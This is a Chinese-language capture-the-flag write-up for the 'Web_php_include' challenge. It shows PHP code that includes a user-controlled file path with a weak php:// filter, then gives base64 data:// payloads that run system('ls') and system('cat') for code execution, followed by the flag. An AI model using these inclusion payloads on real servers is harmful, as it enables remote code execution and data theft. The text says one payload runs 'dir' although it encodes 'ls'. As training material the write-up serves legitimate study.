# T4 Web_php_include

> 题目：攻防世界 Web_php_include

__0x00 审题__

打开题目如下：

```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

__0x01 解题__

> 因为最近刚看了PHP伪协议，所以打算用它来做

* 代码中有一块过滤了php://，我们可以用其他协议，例如：data：//

> 小介绍（data：//）：php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码

1. 引用<?php system("dir")?>，构造payload： ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=  （base64编码之前有过工具链接）

2. 发现文件“fl4gisisish3r3.php”，采用<?php system("cat fl4gisisish3r3.php")?>,构造payload：data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==

__0x02 答案__

得到flag：ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}
